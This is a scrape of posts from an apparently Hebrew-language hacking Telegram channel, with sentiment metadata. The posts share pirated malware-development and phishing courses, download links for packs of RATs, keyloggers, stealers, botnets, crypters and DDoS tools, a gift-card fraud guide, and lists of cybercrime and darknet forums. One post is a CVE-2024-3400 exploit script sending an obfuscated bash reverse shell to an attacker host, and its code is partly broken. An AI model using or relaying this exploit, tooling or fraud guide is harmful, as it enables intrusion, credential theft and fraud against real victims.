+https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw
+10. LiveOverflow =
+https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
+
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://t.me,https://t.me",,
+-1001574796698,2024-10-14 11:41:10,"RED TEAM Operator: Malware Development Intermediate Course
+More advanced offensive security tools (OST) development techniques in Windows, including: API hooking, 32-/64-bit migrations, reflective binaries and more.
+
+להורדה: https://www.mediafire.com/file/3zzxjnmq7478neh/2._Malware_Development_Intermediate.rar/file
+
+RED TEAM Operator: Malware Development Advanced - Vol.1
+Advanced offensive security tool (OST) development topics for Windows user land only, including: hidden data storage, rootkit techniques, finding privileged objects in system memory, detecting new process creation, generating and handling exceptions, building COFFs and custom RPC-like instrumentation, and more.
+
+להורדה: https://www.mediafire.com/file/eng3utivdvdf9xn/3._Malware_Development_Advanced.rar/file
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.136, 'neu': 0.712, 'pos': 0.151, 'compound': -0.4639}",-0.4639,ICD,,"https://www.mediafire.com,https://www.mediafire.com,https://t.me,https://t.me",,
+-1001574796698,2024-10-02 09:26:24,"🔥 קריפטו-jacking
+
+✍️✍️✍️✍️
+🔄 קריפטו-jacking, הידוע גם כ-cryptomining malware, מאפשר להאקרים להשתמש בכוח העיבוד של המערכת של הקורבן (כגון מחשב, טלפון נייד או שרת) כדי לכרות מטבעות קריפטוגרפיים כמו ביטקוין או Monero ללא ידיעתם ​​או רשותם.
+
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8
+
+♻️שתפו את הערוץ שלנו ותמכו בנו♻️","{'neg': 0.081, 'neu': 0.919, 'pos': 0.0, 'compound': -0.6476}",-0.6476,ICD,,"https://t.me,https://t.me",,
+-1001574796698,2024-09-06 14:23:25,"📚 TCMSecurity - כל הקורסים 📚
+
+https://mega.nz/folder/36JX3SwZ#EICCMbXsXnrxSqdHaNbYKA rb.gy/o6w92n
+
+📚 TCMSecurity - Linux 101 📚
+https://mega.nz/folder/z6RFEIYZ#93ZN1XU_hRJikleN9WIgow rb.gy/o6w92n 
+
+📚 TCMSecurity - Linux Privilege Escalation for Beginners 📚
+https://mega.nz/folder/viRBGIiR#B_UW6lMw2ODS5Obd1EOtBA rb.gy/o6w92n
+
+📚 TCMSecurity - Movement, Pivoting and Persistence 📚
+https://mega.nz/folder/2nB3kACZ#6X1kbg20XJXVGKczmRQHjA rb.gy/o6w92n
+
+📚 TCMSecurity - Practical Malware Analysis & Triage 📚
+https://mega.nz/folder/zrQHlKyS#ZUPIYssfkZaXj578WIUtWQ rb.gy/o6w92n
+
+📚 TCMSecurity - Practical Phishing Assessments 📚
+https://mega.nz/folder/frgnVY5A#A02_HFg-SKzn21jpG3l-Lg rb.gy/o6w92n
+
+
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8
+
+♻️שתפו את הערוץ שלנו ותמכו בנו♻️","{'neg': 0.134, 'neu': 0.825, 'pos': 0.04, 'compound': -0.7777}",-0.7777,ICD,,"https://mega.nz,https://mega.nz,https://mega.nz,https://mega.nz,https://mega.nz,https://mega.nz,https://t.me,https://t.me",,
+-1001574796698,2024-08-27 10:25:07,"🧰 כלי פריצה ב-GitHub
+ 
+ 5 רשימות הכלים המובילות מבית GitHub, הכוללות מאות כלים שונים ועוד הרבה מידע ...
+
+1. Awesome Hacking (https://github.com/Hack-with-Github/Awesome-Hacking) 
+2. Hackingtool (https://github.com/Z4nzu/hackingtool#all-in-one-hacking-tool-for-hackers) 
+3. Awesome Hacker Search Engines (https://github.com/edoardottt/awesome-hacker-search-engines) 
+4. Awesome Penetration Testing (https://github.com/ByteHackr/HackingTools-2)
+5. TOP-500+-HACKING-TOOLS (https://github.com/Monsterlallu/Top-500-hacking-tools)
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 0.777, 'pos': 0.223, 'compound': 0.9273}",0.9273,ICD,,"https://github.com,https://github.com,https://github.com,https://github.com,https://github.com,https://t.me,https://t.me",,
+-1001574796698,2024-07-30 19:04:12,"💎 פריצת טלגרם v1.0
+✍️✍️✍️✍️
+⭐️ פרויקט זה מנצל פגיעות 0day בטלגרם כדי לחלץ נתונים רגישים ממכשיר היעד.
+⭐️ בגרסאות המעודכנות, טלגרם שכחה שניתן לגנוב את טלגרם בעדכון האחרון שלה.
+⭐️ לא משנה אם טלגרם מותקן או נייד, ובלי קשר לכמה גרסאות של טלגרם פועלות על המערכת של הקורבן, כלי זה גונב למעשה את הטלגרם של היעד.
+
+פורסם: 💀Telegram ❤️ https://t.me/Exploit_Prv8  
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://t.me,https://t.me,https://t.me",,
+-1001574796698,2024-05-29 07:52:58,"RCE, PAN-OS Palo Alto Networks, CVE-2024-3400
+
+
+**************POC**************
+
+import  requests
+ import  base64
+
+ def  generate_payload (): 
+    # Obfuscated Reverse Shell command for a stealth execution 
+    reverse_shell_command  =  ""bash -c 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1'"" 
+    encoded_command  =  base64 . b64encode ( reverse_shell_command . encode ()). decode () 
+    payload  =  f ""$({{echo {encoded_command} | base64 -d | bash}})"" 
+    return  payload
+
+ def  send_exploit_request ( target_url ,  payload ): 
+    headers  =  { 
+        ""User-Agent"" :  ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"" , 
+        ""Content-Type"" :  ""application/xml"" 
+    } 
+    
+    exploit_data  =  f ""<?xml version='1.0' encoding='UTF-8'?><exploit>{payload}</exploit>"" 
+    response  =  requests . post ( target_url ,  headers = headers ,  data = exploit_data ) 
+    
+    return  response
+
+ def  exploit_target ( target_url ): 
+    payload  =  generate_payload () 
+    response  =  send_exploit_request ( target_url ,  payload ) 
+    
+    if  response . status_code  ==  200 : 
+        print ( ""Exploit successful! Full-system takeover achieved with stealthy reverse shell."" ) 
+    else : 
+        print ( ""Exploit failed. Target system may not be vulnerable or payload detected."" ) 
+
+def  main (): 
+    target_url  =  ""https://vulnerablewebsite.com/vulnerable_endpoint"" 
+    exploit_target ( target_url ) 
+
+if  name  ==  ""main"" : 
+    main
+
+************************************************
+
+
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+
+♻️שתפו את הערוץ שלנו ותמכו בנו♻️
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.122, 'neu': 0.83, 'pos': 0.048, 'compound': -0.9058}",-0.9058,ICD,,"https://vulnerablewebsite.com,https://t.me,https://t.me",,
+-1001574796698,2024-05-13 07:50:32,"OPTION 1: https://www.upload.ee/files/16611881/Proxy_Tools_and_Grabbers.rar.html
+OPTION 2: https://ufile.io/k9dev4sg
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  RATS PACK 
+
+OPTION 1: https://www.upload.ee/files/16611887/RATS_PACK.rar.html
+OPTION 2: https://ufile.io/vbnhfdus
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Remote Hacking Tools PACK 
+
+OPTION 1: https://www.upload.ee/files/16611888/Remote_Hacking_Tools_PACK.rar.html
+OPTION 2: https://ufile.io/jmwbbdfl
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  SEO Tools Utilities 
+
+OPTION 1: https://www.upload.ee/files/16611891/SEO_Tools_Utilities.rar.html
+OPTION 2: https://ufile.io/mzufxnnl
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Spotify Tools PACK 
+
+OPTION 1: https://www.upload.ee/files/16611893/Spotify_Tools_PACK.rar.html
+OPTION 2: https://ufile.io/90vz2cat
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  SQLi TOOLS 
+
+OPTION 1: https://www.upload.ee/files/16611892/SQLi_TOOLS.rar.html
+OPTION 2: https://ufile.io/822nhjym
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Steam Cracking PACK 
+
+OPTION 1: https://www.upload.ee/files/16611895/Steam_Cracking_PACK.rar.html
+OPTION 2: https://ufile.io/cbaczhzv
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  VPN Tools & Utilities PACK 
+
+OPTION 1: https://www.upload.ee/files/16611901/VPN_Tools___Utilities_PACK.rar.html
+OPTION 2: https://ufile.io/aifylee9
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Vulnerabilities Scanners 
+
+OPTION 1: https://www.upload.ee/files/16611899/Vulnerabilities_Scanners.rar.html
+OPTION 2: https://ufile.io/5ok15lns
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Website HACKPACK 
+
+OPTION 1: https://www.upload.ee/files/16611918/WEBSITE_HACK.rar.html
+OPTION 2: https://ufile.io/68vzwban
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Youtube - Twitch - Social TOOLS 
+
+OPTION 1: https://www.upload.ee/files/16611897/Youtube_-_Twitch_-_Social_TOOLS.rar.html
+OPTION 2: https://ufile.io/0mprzugz
+OPTION 3: https://gofile.io/d/m85ZsW
+
+
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+
+♻️שתפו את הערוץ שלנו ותמכו בנו♻️
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+M6WByrFSVYk2MjBk","{'neg': 0.011, 'neu': 0.989, 'pos': 0.0, 'compound': -0.2244}",-0.2244,ICD,,"https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://t.me,https://t.me",,
+-1001574796698,2024-05-13 07:50:32,"MasterCracking - TOOLS ⭐️ Account Generators & More PACK 
+
+OPTION 1: https://www.upload.ee/files/16611832/Generators_PACK.rar.html
+OPTION 2: https://ufile.io/nfrk03i7
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Basic Utilities Tools 
+
+OPTION 1: https://www.upload.ee/files/16611833/Basic_Utilities_Tools.rar.html
+OPTION 2: https://ufile.io/30o2rd2n
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Botnets PACK 
+
+OPTION 1: https://www.upload.ee/files/16611834/Botnets_PACK.rar.html
+OPTION 2: https://ufile.io/84dnoiw8
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Bots - Traffic - Automatic Tools 
+
+OPTION 1: https://www.upload.ee/files/16611849/Bots_-_Traffic_-_Automatic_Tools.rar.html
+OPTION 2: https://ufile.io/9lxuc2wo
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️ BruteForcers PACK 
+
+OPTION 1: https://www.upload.ee/files/16611850/BruteForcers_PACK.rar.html
+OPTION 2: https://ufile.io/relrdq2m
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️ Checkers PACK 
+
+OPTION 1: https://www.upload.ee/files/16611848/Checkers_PACK.rar.html
+OPTION 2: https://ufile.io/f0mo85td
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Combo Editors & Makers PACK 
+
+OPTION 1: https://www.upload.ee/files/16611857/Combo_Editors___Makers_PACK.rar.html
+OPTION 2: https://ufile.io/hg1e9665
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Crypters & Binders 
+
+OPTION 1: https://www.upload.ee/files/16611855/Crypters___Binders.rar.html
+OPTION 2: https://ufile.io/bw7m328x
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Crypto Bots - Utilities - Btc TOOLS 
+
+OPTION 1: https://www.upload.ee/files/16611856/Crypto_Bots_-_Utilities_-_Btc_TOOLS.rar.html
+OPTION 2: https://ufile.io/g1r55bjq
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  DDOS - DDOSER Tools 
+
+OPTION 1: https://www.upload.ee/files/16611864/DDOS_-_DDOSER_Tools.rar.html
+OPTION 2: https://ufile.io/srjda1d4
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Discord Tools PACK 
+
+OPTION 1: https://www.upload.ee/files/16611863/Discord_Tools_PACK.rar.html
+OPTION 2: https://ufile.io/iw7zkyml
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Dorkers Premium 
+
+OPTION 1: https://www.upload.ee/files/16611865/Dorkers_Premium.rar.html
+OPTION 2: https://ufile.io/d1qrq1aa
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  EMAIL TOOLS PACK 
+
+OPTION 1: https://www.upload.ee/files/16611869/EMAIL_TOOLS_PACK.rar.html
+OPTION 2: https://ufile.io/a1jsg5b3
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Hacking Software 
+
+OPTION 1: https://www.upload.ee/files/16611867/Hacking_Software.rar.html
+OPTION 2: https://ufile.io/wnvyofif
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Instagram Tools PACK 
+
+OPTION 1: https://www.upload.ee/files/16611868/Instagram_Tools_PACK.rar.html
+OPTION 2: https://ufile.io/zc3h6v61
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Keyloggers PACK 
+
+OPTION 1: https://www.upload.ee/files/16611877/Keyloggers_PACK.rar.html
+OPTION 2: https://ufile.io/04ugq7vl
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Leechers PACK 
+
+OPTION 1: https://www.upload.ee/files/16611878/Leechers_PACK.rar.html
+OPTION 2: https://ufile.io/id1mdoul
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Malware - Worms Stealers 
+
+OPTION 1: https://www.upload.ee/files/16611879/Malware_-_Worms_Stealers.rar.html
+OPTION 2: https://ufile.io/jazzq9jb
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Netflix Tools PACK 
+
+OPTION 1: https://www.upload.ee/files/16611882/Netflix_Tools_PACK.rar.html
+OPTION 2: https://ufile.io/ida34vhp
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  OpenBullet COLLECTION 
+
+OPTION 1: https://www.upload.ee/files/16611883/OpenBullet_COLLECTION.rar.html
+OPTION 2: https://ufile.io/b2f2pm8y
+OPTION 3: https://gofile.io/d/m85ZsW
+
+MasterCracking - TOOLS ⭐️  Proxy Tools and Grabbers","{'neg': 0.032, 'neu': 0.968, 'pos': 0.0, 'compound': -0.872}",-0.872,ICD,,"https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io",,
+-1001574796698,2024-05-10 14:04:52,"🧐 קורס אנליסט תוכנות זדוניות - רמה 1
+
+מידע נוסף: https://training.trainsec.net/malware-analyst-professional-level-1
+
+📛הערה📛
+המידע למטרות לימודיות בלבד!
+
+♻️שתפו את הערוץ שלנו ותמכו בנו♻️
+ 
+🌐 ערוץ טלגרם: https://t.me/ICyberDefence
+💬 קבוצה: https://t.me/+M6WByrFSVYk2MjBk","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://training.trainsec.net,https://t.me,https://t.me",,
+-1001574796698,2024-03-29 14:15:48,"🗜🖥 Commix (short for [comm]and [i]njection e[x]ploiter) is an open source penetration testing tool that automates the detection and exploitation of command injection vulnerabilities.
+
+https://github.com/commixproject/commix?tab=readme-ov-file","{'neg': 0.062, 'neu': 0.938, 'pos': 0.0, 'compound': -0.1531}",-0.1531,ICD,,https://github.com,,
+-1001574796698,2024-03-27 05:56:39,📡OSWP: WPA/WPA2 PSK Cracking,"{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,,,
+-1001574796698,2024-03-13 11:41:48,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+ 
+If you use this make sure to use the English version of G2A.com otherwise this will not work!
+ 
+PDF guide here:
+https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_523918.pdf","{'neg': 0.0, 'neu': 0.7, 'pos': 0.3, 'compound': 0.9402}",0.9402,ICD,,https://drive.google.com,,
+-1001574796698,2024-03-01 09:56:29,"|[REVERSING](https://reversing.center) | ONLINE | |
+|[RF-CHEAT](https://www.rf-cheats.ru) | ONLINE | |
+|[RUTOR (Dark)](http://rutordeepkpafpudl22pbbhzm4llbgncu...xcid.onion)| ONLINE | |
+|[RUTOR (Deep)](https://darknet.rutor.nl) | ONLINE | |
+|[RUTOR (Surface)](http://rutor.info) | ONLINE 
+|[RUTOR (Surface)](http://rutor.is) | ONLINE 
+|[RUTOR (Surface)](http://rutor.live) | ONLINE 
+|[RUTOR (Surface)](http://rutor.gs) | ONLINE 
+|[RUTOR (Surface)](http://rutor.fr) | ONLINE 
+|[RUTOR (Surface)](http://rutor.la) | ONLINE 
+|[RUTOR (Surface)](http://rutor.ac) | ONLINE 
+|[RUTOR (Surface)](http://rutor.li) | ONLINE 
+|[SEOPIRAT](https://seopirat.club) | ONLINE ||
+|[SINFUL](https://sinfulsite.com)| ONLINE | |
+|[SINISTER](https://sinister.ly)| ONLINE | |
+|[SKYFRAUD](http://bcbm4y7yusdxthg3.onion)| OFFLINE | |
+|[SKYNETZONE.BIZ](https://skynetzone.biz)| ONLINE | |
+|[SKYNETZONE.PW](https://skynetzone.pw)| ONLINE | |
+|[SOFTXAKER](http://forum.softxaker.ru)| ONLINE | |
+|[SPYHACKERZ](https://spyhackerz.org)| ONLINE | |
+|[SQLI](https://sqli.cloud)| ONLINE | |
+|[SUPERBAY](http://suprbaydvdcaynfo4dgdzgxb4zuso7rft...lcad.onion)| ONLINE | |
+|[THE GOOD LIFE](https://thegoodlife.to)| ONLINE | |
+|[THE HUB](http://thehubwav7canwaq7trm6zl3tqvkf2kwb...u3yd.onion)| ONLINE | |
+|[THE JAVA SEA](https://thejavasea.com)| ONLINE | |
+|[TOOLBASE](https://toolba.se)| ONLINE | |
+|[TRAFA NET](https://trafa.net)| ONLINE | |
+|[V-H.GURU](https://v-h.guru)| ONLINE | |
+|[VAVILON](https://vavilon.cc)| ONLINE | |
+|[VERIFIED (Dark)](http://verified3vr2kdbnza6c3e5ak4z5xmtti.../index.php)| ONLINE | |
+|[VERIFIED (Deep)](https://ver.sc/index.php)| OFFLINE | |
+|[VERYLEAKS](https://veryleaks.cz)| ONLINE | |
+|[VLMI](https://vlmi.ws)| ONLINE | |
+|[VSEMMONEY](https://vsemmoney.com)| ONLINE | |
+|[WWHCLUB](https://wwh-club.io)| ONLINE | |
+|[XREACTOR](https://xreactor.org)| ONLINE | |
+|[XSS (Dark)](http://xssforumv3isucukbxhdhwz67hoa5e2vo...ruid.onion)| ONLINE | |
+|[XSS (Deep)](https://xss.is)| ONLINE | |
+|[YOUHACK](https://youhack.xyz)| ONLINE | |
+|[KKKSecForum](https://forum.kkksec.com)| ONLINE | |
+|[DarkForum](https://darkforum.in)| ONLINE | |
+|[D4rkForums](https://d4rkforums.net)| ONLINE | |
+|[DataForums](https://dataforums.co)| ONLINE | |
+|[ZDL](https://zdl.pw)| ONLINE | |
+|[BreachForums](https://breachforums.vc/) | ONLINE | |
+|[BreachForums (Dark)](http://breached4w3qphorxg2fwqkhpfnsyf65j...ymad.onion)| ONLINE | |
+|[OnniForums](https://onniforums.com) | ONLINE | |
+|[INCIDIOUS](https://incidious.se) | ONLINE | |
+|[BHC Forums](https://bhcforums.cc) | ONLINE | |
+|[Korovka](https://korovka.cc) | ONLINE | |
+|[Darkpid](https://darkpid.com) | ONLINE | |
+|[Antichat](https://forum.antichat.com) | ONLINE | |
+|[Lampeduza](https://lampeduza.la) | ONLINE | |
+|[CRACKING](https://cracking.org) | ONLINE | |","{'neg': 0.033, 'neu': 0.94, 'pos': 0.027, 'compound': 0.0431}",0.0431,ICD,,"https://reversing.center,https://www.rf-cheats.ru,http://rutordeepkpafpudl22pbbhzm4llbgncu...xcid.onion,https://darknet.rutor.nl,http://rutor.info,http://rutor.is,http://rutor.live,http://rutor.gs,http://rutor.fr,http://rutor.la,http://rutor.ac,http://rutor.li,https://seopirat.club,https://sinfulsite.com,https://sinister.ly,http://bcbm4y7yusdxthg3.onion,https://skynetzone.biz,https://skynetzone.pw,http://forum.softxaker.ru,https://spyhackerz.org,https://sqli.cloud,http://suprbaydvdcaynfo4dgdzgxb4zuso7rft...lcad.onion,https://thegoodlife.to,http://thehubwav7canwaq7trm6zl3tqvkf2kwb...u3yd.onion,https://thejavasea.com,https://toolba.se,https://trafa.net,https://v-h.guru,https://vavilon.cc,http://verified3vr2kdbnza6c3e5ak4z5xmtti...,https://ver.sc,https://veryleaks.cz,https://vlmi.ws,https://vsemmoney.com,https://wwh-club.io,https://xreactor.org,http://xssforumv3isucukbxhdhwz67hoa5e2vo...ruid.onion,https://xss.is,https://youhack.xyz,https://forum.kkksec.com,https://darkforum.in,https://d4rkforums.net,https://dataforums.co,https://zdl.pw,https://breachforums.vc,http://breached4w3qphorxg2fwqkhpfnsyf65j...ymad.onion,https://onniforums.com,https://incidious.se,https://bhcforums.cc,https://korovka.cc,https://darkpid.com,https://forum.antichat.com,https://lampeduza.la,https://cracking.org",,
+-1001574796698,2024-03-01 09:56:29,"|[DWF (Tor v3)](http://dwforumuugiyderhybcpfxmlmoawgq6z3...ybad.onion)| ONLINE | |
+|[ELEAKS](https://eleaks.to)| ONLINE | |
+|[ENCLAVE](https://www.enclave.cc)| ONLINE | |
+|[ENDWAY](https://endway.su)| ONLINE | |
+|[ETERNIA](https://eternia.to)| ONLINE | |
+|[EVILARMY](https://evilarmy.in)| ONLINE | |
+|[EXPLOIT.IN (Dark)](https://exploitivzcm5dawzhe6c32bbylyggbj...kmqd.onion)| ONLINE | |
+|[EXPLOIT.IN (Deep)](https://exploit.in)| ONLINE | |
+|[EXPLOITS.WS](https://exploits.ws)| ONLINE | |
+|[FORUMTEAM.ONLINE](https://forumteam.online)| ONLINE | |
+|[FORUMTEAM.TOP](https://forumteam.top)| ONLINE | |
+|[FSSQUAD](https://fssquad.com)| ONLINE | |
+|[G0D.ONE MARKET](https://www.g0d.one)| OFFLINE | |
+|[GERKI](http://gerkipwhfuqeeizl.onion)| OFFLINE | |
+|[GETREKT](https://getrekt.io)| ONLINE | https://t.me/getrektio |
+|[HACKFORUMS](https://hackforums.net/index.php)| ONLINE | |
+|[HACKTOWN](http://hacktowns3sba2xavxecm23aoocvzciax...kTown.html)| ONLINE | |
+|[HELIUM](http://fahue6hb7odzns36vfoi2dqfvqvjq4btt...nion/login)| ONLINE | |
+|[HOHEKAMMER](http://hohekammer.cc)| ONLINE | |
+|[IFUD](https://ifud.cx)| OFFLINE | |
+|[INFECTED ZONE](https://infected-zone.com)| ONLINE | |
+|[INFINITY](https://infinity.ink)| ONLINE | |
+|[ITALIAN DARKNET COMMUNITY 3.0 (Dark)](http://dhri7ogvfpnflpkj3sc5x7umjl4gd26bk...zmqd.onion)| OFFLINE | |
+|[IN4BZ](https://in4.bz)| ONLINE | |
+|[KICKASS](http://o3nqszgvtqwcc2mxqcqgeyulkh6spiv6y...5aad.onion)| ONLINE | |
+|[KOROVKA](http://korovka.cc)| ONLINE | |
+|[LEAKBASE](https://leakbase.cc)| ONLINE | |
+|[LEAKBASE](https://leakbase.org)| ONLINE | |
+|[LEAK FORUMS](https://leakforums.su)| ONLINE | |
+|[LEAKS.SO](https://leaks.so)| ONLINE | |
+|[LEAKS.SX](https://leak.sx)| ONLINE | |
+|[LeVeL23HackTools](https://level23hacktools.com/hackers)| ONLINE | |
+|[LOLZ](https://lolz.guru)| ONLINE | |
+|[LOWENDTALK](http://lowendtalk.com)| ONLINE | |
+|[MAILPASS](https://mailpass.club)| OFFLINE | |
+|[MASTODON](https://masthead.social/auth/sign_in)| ONLINE | |
+|[MEGATOP](https://megatop.biz)| ONLINE | |
+|[MIPPED](https://mipped.com)| ONLINE | |
+|[MMGP](https://mmgp.com)| ONLINE | |
+|[MONEYDARK](https://moneymn.club)| OFFLINE | |
+|[NEFARIUM](http://zcfl6nxpefzmythaqbqi7s3fgjsb4tobp...ijid.onion)| ONLINE | |
+|[NIFLHEIM.TOP](https://niflheim.top)| ONLINE | |
+|[NIGGAFORUMS (BLACKFORUMS MIRROR)](https://niggaforums.net)| ONLINE | |
+|[NIGGAFORUMS (BLACKFORUMS MIRROR)](https://niggaforums.me)| ONLINE | |
+|[NITTER](http://3nzoldnxplag42gqjs23xvghtzf6t6yzs...oad.onion/)| OFFLINE | |
+|[NOHIDESPACE](https://nohide.space)| ONLINE | |
+|[NULLED](https://www.nulled.to)| ONLINE | |
+|[NULLEDBB](https://nulledbb.com)| ONLINE | |
+|[OGUSERS](https://www.ogusers.com)| OFFLINE | |
+|[OMERTA](https://omerta.cc)| ONLINE | |
+|[OMERTA](https://omerta.wf)| OFFLINE | |
+|[OMERTA](https://omerta.cx)| ONLINE | |
+|[OMERTA](https://omert.cc)| ONLINE | |
+|[OPENSSOURCE](https://openssource.org)| ONLINE | |
+|[PATCHED.TO](https://patched.to)| ONLINE | |
+|[PAYLOAD.SH](https://payload.sh)| ONLINE | |
+|[PHREAKER](https://phreaker.info)| ONLINE | |
+|[PIRATEBUHTA](https://s1.piratebuhta.net)| ONLINE | |
+|[PROBIV](https://probiv.one)| ONLINE | |
+|[PROCRD](https://procrd.pw)| ONLINE | |
+|[PROJECT SPHERE](http://psphere7gzibrekpbvzitrul46aol2ibv...aad.onion/)| OFFLINE | |
+|[PROLOGIC](https://prologic.su)| ONLINE | |
+|[PROTON](https://proton.sc)| ONLINE | |
+|[RAID FORUMS (Mirror 1)](https://rf.ws)| OFFLINE | |
+|[RAID FORUMS (Mirror 2)](https://raid.lol)| OFFLINE | |
+|[RAID FORUMS (Mirror 3)](https://rfmirror.com)| OFFLINE | |
+|[RAID FORUMS 2](https://raidforums2.com)| OFFLINE | |
+|[RAID FORUMS TWO](https://raidforumstwo.com)| OFFLINE | |
+|[RAID FORUMS](https://raidforums.com)| OFFLINE | |
+|[RAMBLE](http://rambleeeqrhty6s5jgefdfdtc6tfgg4jj...baad.onion)| ONLINE | |
+|[RAMP (Old)](http://ramp4u5iz4xx75vmt6nk5xfrs5mrmtokz...7zid.onion) | OFFLINE | |
